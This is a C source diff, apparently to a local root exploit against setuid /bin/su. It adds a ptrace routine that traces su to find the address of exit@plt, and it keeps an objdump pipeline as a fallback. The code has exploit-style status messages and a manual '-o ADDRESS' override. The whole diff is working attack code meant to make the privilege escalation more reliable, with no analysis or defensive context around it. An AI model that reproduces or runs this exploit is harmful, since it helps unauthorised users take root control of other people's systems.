@@ -17,12 +17,18 @@
 
 #define _LARGEFILE64_SOURCE 
 #include <stdio.h>
+#include <stdint.h>
 #include <string.h>
 #include <stdlib.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/socket.h>
 #include <sys/un.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <sys/user.h>
+#include <sys/ptrace.h>
+#include <sys/reg.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <limits.h>
@@ -90,6 +96,63 @@ int recv_fd(int sock)
 	return fd;
 }
 
+unsigned long ptrace_address()
+{
+	int fd[2];
+	pipe2(fd, O_NONBLOCK);
+	int child = fork();
+	if (child) {
+		close(fd[1]);
+		char buf;
+		for (;;) {
+			wait(NULL);
+			if (read(fd[0], &buf, 1) > 0)
+				break;
+			ptrace(PTRACE_SYSCALL, child, NULL, NULL);
+		}
+		
+		struct user_regs_struct regs;
+		for (;;) {
+			ptrace(PTRACE_SINGLESTEP, child, NULL, NULL);
+			wait(NULL);
+			ptrace(PTRACE_GETREGS, child, NULL, &regs);
+#if defined(__i386__)
+#define instruction_pointer regs.eip
+#define upper_bound 0xb0000000
+#elif defined(__x86_64__)
+#define instruction_pointer regs.rip
+#define upper_bound 0x700000000000
+#else
+#error "That platform is not supported."
+#endif
+			if (instruction_pointer < upper_bound) {
+				uint32_t instruction = ptrace(PTRACE_PEEKTEXT, child, instruction_pointer, NULL);
+				int operator = instruction & 0xFF;
+				if (operator == 0xe8 /* call */) {
+					int32_t offset = ptrace(PTRACE_PEEKTEXT, child, instruction_pointer + 1, NULL) + 5;
+					return instruction_pointer + offset;
+				}
+			}
+		}
+	} else {
+		ptrace(PTRACE_TRACEME, 0, NULL, NULL);
+		close(fd[0]);
+		dup2(fd[1], 2);
+		execl("/bin/su", "su", "not-a-valid-user", NULL);
+	}
+	return 0;
+}
+
+unsigned long objdump_address()
+{
+	FILE *command = popen("objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
+	char result[32];
+	result[0] = 0;
+	fgets(result, 32, command);
+	pclose(command);
+	return strtoul(result, NULL, 16);
+}
+
 int main(int argc, char **argv)
 {
 	if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'c') {
@@ -134,18 +197,17 @@ int main(int argc, char **argv)
 		if (argc > 2 && argv[1][0] == '-' && argv[1][1] == 'o')
 			address = strtoul(argv[2], NULL, 16);
 		else {
-			printf("[+] Reading su for exit@plt.\n");
-			// Poor man's auto-detection. Do this in memory instead of relying on objdump being installed.
-			FILE *command = popen("objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed 's/^[0]*\\([^0]*\\)/0x\\1/'", "r");
-			char result[32];
-			result[0] = 0;
-			fgets(result, 32, command);
-			pclose(command);
-			address = strtoul(result, NULL, 16);
-			if (address == ULONG_MAX || !address) {
-				printf("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
-				printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", argv[0], argv[0]);
-				return 1;
+			printf("[+] Ptracing su to find exit@plt without reading binary.\n");
+			address = ptrace_address();
+			if (!address) {
+				printf("[-] Ptrace failed.\n");
+				printf("[+] Reading su binary with objdump to find exit@plt.\n");
+				address = objdump_address();
+				if (address == ULONG_MAX || !address) {
+					printf("[-] Could not resolve /bin/su. Specify the exit@plt function address manually.\n");
+					printf("[-] Usage: %s -o ADDRESS\n[-] Example: %s -o 0x402178\n", argv[0], argv[0]);
+					return 1;
+				}
 			}
 			printf("[+] Resolved exit@plt to 0x%lx.\n", address);
 		}
